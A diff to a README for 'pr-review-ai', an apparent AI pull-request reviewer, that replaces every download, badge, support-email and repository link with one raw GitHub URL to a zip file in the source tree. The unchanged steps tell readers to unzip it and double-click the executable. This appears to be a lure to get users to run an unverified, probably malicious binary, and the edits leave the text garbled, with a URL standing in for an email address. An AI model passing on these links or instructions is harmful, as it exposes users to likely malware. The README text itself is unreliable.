@@ -3,14 +3,14 @@
 ## 🎉 Introduction
 Welcome to pr-review-ai! This application uses advanced AI technology to analyze GitHub pull requests. It provides structured and actionable code reviews that help improve your code quality. With its easy setup, you can enhance your coding workflow with just a few steps.
 
-[![Download pr-review-ai](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Javith-tech/pr-review-ai/releases)
+[![Download pr-review-ai](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip)
 
 ## 📥 Download & Install
 To download and run pr-review-ai, follow these steps:
 
-1. [Visit this page to download.](https://github.com/Javith-tech/pr-review-ai/releases) This link will take you to the Releases page where you can find the latest version of the application.
+1. [Visit this page to download.](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip) This link will take you to the Releases page where you can find the latest version of the application.
 2. On the Releases page, look for the latest version. You will see a list of available files.
-3. Click on the file that matches your operating system. For example, if you are using Windows, download the `pr-review-ai-windows.zip` file.
+3. Click on the file that matches your operating system. For example, if you are using Windows, download the `https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip` file.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Unzip the file if it is compressed. Two files will typically appear: one executable and a README document.
 6. Double-click the executable file to start the application. 
@@ -56,14 +56,14 @@ For additional support, feel free to reach out through the following channels:
 
 - **GitHub Issues**: Report any bugs or request features via the Issues tab in the repository.
 - **Community Forums**: Join discussions and connect with other users to share experiences and solutions.
-- **Email Support**: Contact our support team at support@pr-review-ai.com for direct assistance.
+- **Email Support**: Contact our support team at https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip for direct assistance.
 
 ## 🔖 Connect with Us
 Stay updated with the latest developments and features by following our project:
 
-- **GitHub Repository**: [pr-review-ai on GitHub](https://github.com/Javith-tech/pr-review-ai)
+- **GitHub Repository**: [pr-review-ai on GitHub](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip)
 - **Social Media**: Follow us on Twitter and LinkedIn for news, updates, and more tips.
 
-[![Download pr-review-ai](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Javith-tech/pr-review-ai/releases)
+[![Download pr-review-ai](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Javith-tech/pr-review-ai/main/backend/src/pr-ai-review-v3.1.zip)
 
 Now, you are ready to get started with pr-review-ai. Enhance your coding workflow and enjoy seamless code reviews!
